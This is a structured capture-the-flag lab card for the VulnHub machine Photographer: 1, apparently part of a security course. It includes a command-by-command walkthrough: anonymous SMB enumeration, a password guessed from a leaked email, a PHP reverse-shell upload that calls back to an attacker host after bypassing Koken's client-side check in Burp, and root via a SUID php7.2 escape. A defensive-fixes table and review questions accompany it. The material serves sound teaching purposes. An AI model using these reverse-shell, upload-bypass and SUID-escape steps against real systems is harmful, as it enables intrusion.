# Machine 11 — Photographer: 1

> **Position:** 11 of 13 · **Band 3 — Easy** (global rank **055** of 708)
> **Full writeup:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)

| | |
| --- | --- |
| **Machine** | Photographer: 1 |
| **Author** | Vinícius Vieira ("v1n1v131r4") |
| **Released** | 21 July 2020 |
| **Target OS** | Ubuntu 16.04 (EOL) — Apache 2.4.18, Samba 4.3.11, **Koken CMS 0.22.24**, PHP 7.2 |
| **VulnHub** | [entry/photographer-1,519](https://vulnhub.com/entry/photographer-1,519/) |
| **Flags** | 2 — `/home/daisa/user.txt`, `/root/proof.txt` |
| **Estimated time** | 4–6 hours |

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine and its map) · **C** (every command, logically) · **D–H** (defence, review, hints, references, rescue). The new theory here: **anonymous SMB sessions**, **inferring credentials from a leaked email**, **fingerprinting a CMS from HTTP headers**, **client-side vs server-side validation**, **tampering with a request in flight**, and **SUID on an interpreter**.

---

# Part A — The method (theory)

## A.1 Anonymous SMB: what `READ ONLY` and `NO ACCESS` mean

**SMB** (Server Message Block, ports 139/445) is Windows file-and-print-sharing, implemented on Linux
by **Samba**; a server exposes **shares** — named folders you mount and browse. `smbmap` answers the
**only question that matters**: can you **read** it, can you **write** to it? `READ ONLY` = read, not
write — **enough** for an attacker, because data at rest holds **secrets**. `NO ACCESS` = you cannot
even list it. **Anonymous/guest** access — empty credentials, a **null session** — is among the most
common findings in internal assessments; **always test it first**.

## A.2 Inferring credentials from a leaked email

The entry is **not** a code vulnerability — it is an **anonymous share containing real company
correspondence**. The email hands over two full addresses and hints the password:

> *"Don't forget your secret, my babygirl ;)"*

Two things make this a foothold: **Koken's login asks for an *email*, not a username**, so the `To:`
line *is* the login identifier; and the emphasised word is a **password hint**, hence a **short,
thematic** guess list rather than a 14-million-line dictionary. **Real breach investigations are full
of this** — a ticket, a forwarded email, a password no dictionary would find. The two names are also
your first guess at **local usernames** — `/etc/passwd` confirms them later.

## A.3 Fingerprinting a CMS from headers

A web server's response often **names the software and its exact version**: Nmap's `http-generator`
script reads the page's `<meta name="generator">` tag and prints `http-generator: Koken 0.22.24`.
The workflow is always **version first, research second**: `Koken 0.22.24` + `X-Powered-By:
PHP/7.2.24` on Ubuntu 16.04 → `searchsploit koken`. The PHP version is not trivia either — it tells
you **which interpreter binary to hunt** in the SUID pass later (`/usr/bin/php7.2`).

## A.4 Client-side vs server-side validation

**EDB 48706** (the public proof-of-concept for this CMS bug) says: *"checks the file extension on the
CLIENT side only (JavaScript)"* — the **browser** rejects `.php`, but **the server never checks the
extension at all**. So the fix is not a clever filename; it is to **send what the browser refused**,
by modifying the request **in flight** with an **intercepting proxy** (Burp Suite). The principle:
**validation that runs on the client is not a control — it is a UI convenience.** Whoever controls
the browser controls the request; the server must treat everything that arrives as hostile input.

## A.5 SUID on an **interpreter** — and the `-p` flag

**SUID** (*set-user-ID*) is a permission bit that makes a program run with the privileges of the
**file's owner**, not the caller — read as an `s` where the owner's `x` would be (`-rwsr-xr-x`).
It exists for a reason (`/usr/bin/passwd` must write `/etc/shadow` for you), but on an **interpreter**
— `php`, `python`, `perl`, `bash`, `vim`, `less`, `tar`, `find`, `awk` — it is catastrophic: an
interpreter reads/writes files, spawns processes, opens sockets. **Handing a local user a SUID-root
interpreter is handing them root.** Related: every process has a **real UID** (who you are) and an
**effective UID** (what the kernel checks); SUID elevation changes only the *effective* one — hence
`id` will later show `uid=33(www-data)` and `euid=0(root)` together.

**`-p` is mandatory:** bash **deliberately drops** its effective UID when setuid — hardening —
unless invoked with `-p` ("privileged mode"). Without it: `$`, no root, a wrongly concluded failure.

---

# Part B — The machine

## B.1 What you will learn

1. Enumerate SMB and interpret **`READ ONLY`** vs **`NO ACCESS`**.
2. Download and analyse files from an **anonymous share** (null session).
3. **Infer a credential** from an informal email rather than cracking one.
4. **Fingerprint a CMS from HTTP response headers**.
5. Understand **client-side-only validation** and why it is not a control.
6. Use **Burp Suite** to intercept and modify a request in flight.
7. **Locate an uploaded file** by reading the application's own UI and its storage conventions.
8. Escalate via **SUID PHP**, and understand the critical **`-p`** flag.
9. Read `id` output to distinguish **real UID** from **effective UID**.

## B.2 The map

| Stage | Where |
| --- | --- |
| **Anonymous SMB with correspondence** | `sambashare` :445 → `mailsent.txt`, `wordpress.bkp.zip` |
| **Credential inference** | "my babygirl" → password **`babygirl`** |
| Admin panel exposed | `:8000/admin/` |
| **CMS arbitrary file upload** | Koken 0.22.24, **EDB 48706** — client-side check only |
| Request tampering | **Burp** to strip `.jpg` |
| Uploads inside the document root | `/storage/originals/…/shell.php` |
| Credential reuse: CMS password = system password | `daisa` / `babygirl` → user flag |
| **SUID on a PHP interpreter** | `/usr/bin/php7.2` mode **`4755`** → `euid=0` |

## B.3 Before you start

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** (SMB, and what to hunt for in shares).
- [02 — Web Attacks](../02-Web-Attacks.md) **§6** (file upload → web shell) and §7 (CMS notes).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§5** (reuse).

**Answer before:**
1. What does `smbmap` mean by `READ ONLY`, and is that enough for an attacker?
2. An email says *"Don't forget your secret, my babygirl"*. What is your password candidate list, in what order?
3. A CMS advertises itself in an HTTP response header. Why is that a finding?
4. What is **client-side** validation, and why can an attacker ignore it completely?
5. What does the `-p` flag do when you spawn a shell from a SUID binary?

---

# Part C — The walkthrough, step by step

## Step 1 — Scan

**Theory first.** A port scan is the map the whole engagement is drawn on. `-p-` forces **all 65 535
ports** (services hide on `:8000` and friends), `-sV` fingerprints versions for `searchsploit`,
`-sC` runs default scripts, `-T4` is the right lab speed, `-oN` keeps the evidence.

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
```

```text
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
```

**How to read it.** **Two web servers, two different sites.** Port 80 is a static portfolio (the
author's showcase); port 8000 is an **application**. The `http-generator` line is **the most
valuable line in the scan**: the **CMS name and exact version**, free of charge. A full run also
shows `smb-security-mode … account_used: guest` — **anonymous SMB works** before you have typed a
credential. **`-p-` mattered**: an application on 8000 with nothing on 80 is a common shape that a
default-port scan would have missed entirely.

**How to find `/admin/`?** Port 8000's own HTML links to it (`href="/admin/"`); `dirb`/`gobuster`
confirm. **Beginner trap:** scanning only port 80 — enumerate **every** HTTP port separately.

**Defensive lesson:** version disclosure is free intelligence. Strip it (`ServerTokens Prod`,
`expose_php = Off`) — but suppression only *slows* an attacker; patching is the real fix.

## Step 2 — SMB: anonymous share first

**Theory first.** `smbmap` enumerates every share **and your permission** in one shot; `smbclient`
then browses. `-N` (or an empty password) requests a **null session** — no credentials at all.

```bash
smbmap -u guest -H TARGET
smbclient -L //TARGET -N
smbclient //TARGET/sambashare -N
smb: \> dir
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
```

```text
Disk              Permissions  Comment
----              -----------  -------
print$            NO ACCESS    Printer Drivers
sambashare        READ ONLY    Samba on Ubuntu
IPC$              NO ACCESS    IPC Service (photographer server)

mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020
```

**How to read it.** The **Permissions** column is the whole point: `sambashare` is **READ ONLY** —
not writeable, and **still enough** (A.1). `IPC$` is not a real file share but the RPC channel
`enum4linux` uses. Inside `smbclient`, `dir` lists and `get FILE` downloads. (File sizes vary between
image revisions — cosmetic.)

```text
From: Agi Clarence <agi@photographer.com>
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

**How to read it.** Squeeze every drop out of five lines. **Two full addresses** — and Koken's login
wants an *email*, so `daisa@photographer.com` is your **login identifier**. *"Your site is ready
now"* ties port 8000 to Daisa, the obvious **administrator**; *"my babygirl ;)"* is the **password
hint** — `babygirl` goes first. **Defensive lesson:** never put correspondence on a guest-reachable
share — the attacker never had to break any cryptography at all.

## Step 3 — The decoy backup

**Theory first.** A backup on a public share looks like a jackpot: CMS configs (`wp-config.php`,
`.env`) necessarily hold **plaintext database credentials**. Check contents, not just existence.

```bash
unzip -l wordpress.bkp.zip | head -20
unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i password
```

```text
(no wp-config.php in the archive — only the stock sample)
```

**How to read it.** `-l` lists contents **without extracting**; `-p FILE` prints one member to
stdout. **There is no `wp-config.php`** — only the stock sample, so no secrets. **Beginner trap:**
investing hours in a decoy. Always inspect a backup's contents first — real backups routinely **do**
contain `wp-config.php`, `.env`, `id_rsa`, `*.sql`, so the dead end does not make the habit wrong.
**Defensive lesson:** an exposed backup is itself a reportable finding.

## Step 4 — Fingerprint the application

**Theory first.** You have a version (Step 1); now tie it to a vulnerability. `searchsploit` is
Kali's **offline** Exploit-DB copy. **Read every exploit before running it.**

```bash
curl -sI http://TARGET:8000/admin/
searchsploit koken
searchsploit -m php/webapps/48706.txt && cat 48706.txt
```

```text
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/7.2.24-0ubuntu0.16.04.2
Set-Cookie: koken_session_ci=...; path=/; HttpOnly

Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) | php/webapps/48706.txt

The import function checks the file extension on the CLIENT side only (JavaScript) ...
```

**How to read it.** `curl -sI` fetches **headers only**; `X-Powered-By: PHP/7.2.24` quietly
foreshadows the SUID binary `/usr/bin/php7.2` you hunt in Step 9. The version matches EDB-48706
exactly — and its author (`v1n1v131r4`) is **the author of the VM**, so this is the intended path. The
key sentence — *"checks the extension on the **CLIENT** side"* — is your whole attack plan (A.4):
pass the browser check, then rewrite the filename in Burp. Note `storage/originals/` in the page
HTML — it matters in Step 6.

## Step 5 — Log in with the inferred credential

```text
http://TARGET:8000/admin/
Email:    daisa@photographer.com
Password: babygirl
→ "Welcome back, Daisa."
```

**First try worked** — the hint was literal. **If `babygirl` had not worked**, the correct escalation is a **thematic** list, not a bigger one:

```bash
cewl -d 2 -m 3 -w daisa_words.txt http://TARGET:8000/
printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa daisaahomi babygirl2020 secret mybabygirl >> daisa_words.txt
sort -u daisa_words.txt -o daisa_words.txt
```

**Why.** `cewl` harvests the site's **own** vocabulary — better than rockyou for this account; the
appended variants are the standard transformations, and **`sort -u -o` de-duplicates safely**. Only
then consider brute force (`hydra … http-post-form`) — targeted beats volumetric. **Defensive
lesson:** rate-limit admin logins and screen passwords against breach corpora; `babygirl` is in every
one.

## Step 6 — Upload, intercept, mutate

**Theory first.** Every file-upload attack has one goal: **get a file into a directory the web
server executes, with an extension the server will run**. Koken only *appears* to check the
extension — the check runs in the browser. Hence two copies: `shell.php.jpg` passes the browser
check; Burp rewrites it to `shell.php` before the server sees it.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i "s/127.0.0.1/ATTACKER/; s/1234/4444/" shell.php
grep -nE '^\$(ip|port)' shell.php          # VERIFY before uploading
cp shell.php shell.php.jpg
```

In the Koken admin: **Library → Import content**, start Burp's intercept, upload `shell.php.jpg`,
and in the intercepted multipart request change the filename **wherever it appears**:

```http
Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
→
Content-Disposition: form-data; name="files[]"; filename="shell.php"
```

```text
{"id":17,"title":"shell","filename":"shell.php","storage":{...}}
http://TARGET:8000/storage/originals/3c/13/shell.php
```

**How to read it.** Trap in the request: `Content-Type` already says `image/jpeg` — **the browser
set it from the filename**, as meaningless as the extension check. The JSON confirms the store, and
`storage` reveals the **two-level hashed directory** (`3c/13/`) — **not guessable**. Learn the path
from the response, or hover **Download File** in the admin Content library. **The `grep` before
uploading is the verification step** — an unedited shell dialling `127.0.0.1:1234` costs an hour of
confusion. **Beginner trap:** uploading, seeing "success", never checking where the file went.

## Step 7 — Trigger

**Theory first.** A **reverse shell** (the target connects back to *you*) beats a bind shell:
outbound traffic is almost never filtered. **Listener first, trigger second.**

```bash
nc -lvnp 4444                                  # Kali, first: -l listen -v verbose -n no DNS -p port
curl -s http://TARGET:8000/storage/originals/3c/13/shell.php
```

```text
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How to read it.** **Why visiting the URL executed PHP:** Apache dispatches by **extension** —
`*.php` goes to the interpreter — and `storage/originals/` sits inside the document root. Kept the
`.jpg`, Apache would have served bytes as an image. **Upload plus execute-in-place are the two halves
of every file-upload RCE.** `uid=33(www-data)` is Ubuntu's unprivileged Apache worker — a foothold,
not a flag. Upgrade the crippled shell at once (`python3 -c 'import pty; pty.spawn("/bin/bash")'`,
then `Ctrl+Z`, `stty raw -echo`, `fg`) — otherwise `su`/`sudo` fail and mislead you.

## Step 8 — The user flag is a real boundary

```bash
cat /etc/passwd | grep -v nologin | grep -v /bin/false
ls -la /home/daisa/
cat /home/daisa/user.txt
```

```text
agi:x:1000:1000:Agi Clarence,,,:/home/agi:/bin/bash
daisa:x:1001:1001:Daisa Ahomi,,,:/home/daisa:/bin/bash

-rw------- 1 daisa daisa 38 Jul 21 03:44 user.txt
cat: /home/daisa/user.txt: Permission denied
```

**How to read it.** `/etc/passwd` confirms the two humans from the email are real local accounts —
OSINT becoming system fact. `-rw-------`, owner `daisa`: **only daisa may read it**, so `www-data`
gets `Permission denied` — a **genuine flag boundary**; a shell is not a flag. Two ways forward:
**reuse the Koken password** (`su daisa` / `babygirl` — CMS-to-system reuse, the most common lateral
movement on real engagements), or go straight to root (Step 9). *(Some writeups show `user.txt` read
directly as `www-data`; on the current image the boundary is real — plan for `su`.)*

## Step 9 — The checklist, and why it points at SUID

**Theory first.** Post-exploitation is a **checklist worked cheapest-first**, never improvisation:
`sudo -l` (what may I already run as root?), SUID, capabilities, cron, writable files, credentials,
groups, kernel last — a kernel exploit can panic the VM.

```bash
sudo -l; cat /etc/crontab; uname -r
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/php7.2
```

```text
/bin/ping  /bin/mount  /bin/su  /usr/bin/passwd  /usr/bin/chfn  ...
/usr/bin/php7.2                     <-- NOT stock

-rwsr-xr-x 1 root root 4538528 Jan 14  2020 /usr/bin/php7.2
```

**How to read it.** `sudo -l` offers nothing, crontab is all-default, the kernel (4.4.0-178, patched
April 2020) has Dirty COW and overlayfs long fixed — so: **SUID**. `2>/dev/null` buries the
permission errors that would hide the answer. **Compare against the stock baseline** so the odd entry
jumps out: only `php7.2` is not default. Decode `-rwsr-xr-x`: owner root means `chmod u+s` — **never
a package default** — and `others` includes `www-data`. **Defensive lesson:** diff SUID files against
a baseline (`aide`, `osquery`) — a new SUID file should page someone.

## Step 10 — Escalate

**Theory first.** Look the binary up on **GTFOBins** before inventing anything — its SUID PHP entry
documents this escape: `pcntl_exec` **replaces the process image**, carrying the SUID privilege.

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
id
cat /root/proof.txt
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
```

**Dissect the command — every part is load-bearing:**

| Piece | Meaning |
| --- | --- |
| `/usr/bin/php7.2` | the **absolute path**. Bare `php -r …` may resolve to a different, non-SUID PHP |
| `-r "code"` | run PHP code directly, no file needed |
| `pcntl_exec('/bin/sh', …)` | PHP's **process-control** function: replaces the current process with `/bin/sh`, so the new shell **inherits** the effective UID rather than being spawned as a child |
| `['-p']` | privileged mode — **mandatory** |

**Forgetting `-p` is the number-one mistake here** — bash detects it is setuid and *drops* the
effective UID itself: a normal `$`, no error. Read `id` correctly: `uid=33(www-data)` is the
**real** UID, `euid=0(root)` the **effective** one the kernel consults — full root, but a **SUID
elevation, not a login**, which is why the original identity lingers in the record.
`cat /root/proof.txt` — **both flags captured.** *(GTFOBins lists equivalents, e.g.
`-r "posix_setuid(0); system('/bin/bash -p');"`.)*

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| **Anonymous SMB with correspondence** | Disable anonymous/guest access; require authentication on every share; audit quarterly |
| SMB signing disabled | `server signing = mandatory`; blocks relay attacks |
| Email leaked with a password hint | DLP on shares; user awareness; never write credential hints in shared documents |
| **`babygirl` as a password** | Enforce length + a breached-password check; require MFA on the CMS admin |
| Admin panel reachable from the network | Bind `:8000/admin/` to localhost or a management VLAN; require VPN |
| **Client-side-only upload validation (EDB 48706)** | Validate server-side: extension allow-list, MIME **and** content check, and **re-encode** images (which strips appended PHP) |
| Uploads stored in the document root with the attacker's extension | Store outside the web root; `Content-Disposition: attachment`; disable the PHP engine for that directory |
| `http-generator` / `X-Powered-By` disclose versions | Suppress them — but suppression only slows an attacker; the real fix is upgrading |
| **CMS password = system password** | Unique credentials per service; a secrets manager; alert on credential overlap |
| **SUID root on `/usr/bin/php7.2`** | `chmod u-s`. An SUID interpreter is root for anyone who can run it |
| No sandboxing of the web server (no AppArmor profile enforced) | Verify `aa-status`; confine PHP with `open_basedir`; `ProtectSystem=strict` under systemd |
| Ubuntu 16.04 (EOL; Koken itself discontinued by its vendor) | Upgrade — the root cause behind several findings; there will be no new Koken patch |

**The single biggest lesson:** *people write down their secrets.* The vulnerability was not in
Koken, not in Samba and not in PHP — it was an email on an open file share. Technical controls
matter, but so does the human layer, and it is usually weaker.

---

# Part E — Review questions

1. How did you get the password without cracking anything? Why is that **more** worrying for the defender than a weak password?
2. `smbmap` said `READ ONLY`. Why was read access alone enough to compromise the entire machine?
3. The extension check was in JavaScript. What exactly does that mean about who enforces it, and what is the minimum server-side change that would fix it?
4. Why did you need Burp rather than `curl` here? Could you have done it with `curl`?
5. How did you find the uploaded file's path? Name two independent methods.
6. Why did `pcntl_exec('/bin/sh', ['-p'])` work when `/bin/sh` alone would not?
7. The CMS password equalled the system password. What single policy stops that?
8. Ubuntu 16.04 is EOL. Combined with the missing AppArmor profile, what is the compounding effect?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **80, 139, 445, 8000**. Two things immediately: read the **headers** on 8000 (one names a CMS **and its exact version**), and try **anonymous** access to the SMB shares.
</details>

<details>
<summary><strong>Rung 2 — the share</strong></summary>

`smbmap -H TARGET` → `sambashare READ ONLY`. `smbclient //TARGET/sambashare -N` → `mailsent.txt` +
`wordpress.bkp.zip`. The email → `daisa@photographer.com` and password hint **`babygirl`**.
</details>

<details>
<summary><strong>Rung 3 — the CMS and the upload</strong></summary>

`curl -sI http://TARGET:8000/` → `http-generator: Koken 0.22.24`. Admin `/admin/`; log in
`daisa@photographer.com : babygirl`. `searchsploit koken` → **EDB 48706**. Upload `shell.php.jpg`
and **in Burp strip the `.jpg`**.
</details>

<details>
<summary><strong>Rung 4 — shell, user flag, root</strong></summary>

Listener **first**, then request `/storage/originals/xx/xx/shell.php` → `www-data`. `su daisa` with
`babygirl` → user flag. `find / -perm -4000` → **`/usr/bin/php7.2`** →
`php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"` → root.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **80, 139, 445, 8000**. 2. `smbmap` → **`sambashare`** (READ ONLY). 3. `smbclient -N`
→ `mailsent.txt` + `wordpress.bkp.zip`. 4. email → **`babygirl`**. 5. `Koken 0.22.24`; admin `/admin/`.
6. **EDB 48706**: `shell.php.jpg` → Burp strip `.jpg` → `/storage/originals/…/shell.php` → `www-data`.
7. `su daisa` → user flag. 8. **SUID `php7.2`** → `pcntl_exec -p` → **euid=0** → `/root/proof.txt`.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/photographer-1,519/>
- **English lab:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/11-photographer-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/11-photographer-1.md)
- **Cross-checked writeups** (confirm anonymous SMB, `babygirl`, EDB 48706, SUID php7.2):
  - [root&beer — Photographer 1](https://rootandbeer.com/walkthroughs/photographer-1/)
  - [tbhaxor — Photographer](https://tbhaxor.com/vulnhub-photographer-writeup/)
  - [Hitesh Kadu — Photographer](https://hitesh1210.github.io/posts/photographer-Writeup/)
  - [GTFOBins — php](https://gtfobins.github.io/gtfobins/php/)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** `nmap -p-` → `80/139/445/8000` → anonymous SMB `sambashare` → `mailsent.txt` hint (`babygirl`) → Koken 0.22.24 on :8000, `/admin/` → login `daisa@photographer.com:babygirl` → EDB 48706 → upload `shell.php.jpg`, strip `.jpg` in Burp → execute `/storage/originals/xx/xx/shell.php` → www-data → SUID `/usr/bin/php7.2` → `pcntl_exec('/bin/sh',['-p'])` → root.
  - **Common pitfall:** `-p` is mandatory — without it bash drops the effective UID and `id` never shows `euid=0`; use the absolute `/usr/bin/php7.2`, since a PATH-resolved `php` may not be SUID.
  - **Common pitfall:** the extension tamper must be done in Burp (the browser JS blocks `.php`), and the upload path is a two-level **hashed** directory revealed only after upload — do not guess it; hover **Download File** in the Content library or read it out of the import JSON response.
  - **Common pitfall:** `/home/daisa/user.txt` is `-rw-------`, so `www-data` cannot read it — you need `su daisa` (password `babygirl`), i.e. CMS→system credential reuse.
  - **Alternative route:** `wordpress.bkp.zip` is a decoy (no `wp-config.php`); LinPEAS also finds local MySQL credentials in Koken's config (`/var/www/html/koken/storage/configuration/database.php`, user `kokenuser`), whose `koken_users` table stores daisa's bcrypt hash; and a Meterpreter `php/meterpreter/reverse_tcp` payload works instead of the pentestmonkey shell (tbhaxor).
  - ⚠️ **Verification note:** one writeup (Hitesh Kadu) shows `user.txt` read directly as `www-data`, while the repository's full lab and others hit `Permission denied` on `-rw-------` — treat `su daisa` (or root) as required on the current image.
  - ⚠️ **Verification note:** `wordpress.bkp.zip` is ~12.7 MB in the repository's lab run but ~13.9 MB in other writeups — the image was re-exported; the size is cosmetic and the contents (stock WordPress, decoy) are the same.
  - **Verified sources:** [root&beer](https://rootandbeer.com/walkthroughs/photographer-1/) · [Infosec Articles](https://www.infosecarticles.com/photographer-1-vulnhub-walkthrough) · [tbhaxor](https://tbhaxor.com/vulnhub-photographer-writeup/) · [Hitesh Kadu](https://hitesh1210.github.io/posts/photographer-Writeup/)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- Remember **Burp** — the client-side check cannot be bypassed otherwise.
- If the uploaded file 404s, you guessed the hashed path — re-read it from the **Download File** tooltip or the import JSON.
- If `id` shows `uid=33` without `euid=0`, you forgot **`-p`**.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · next: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-055-photographer-1`](../../labs/3-055-photographer-1/README.md)._
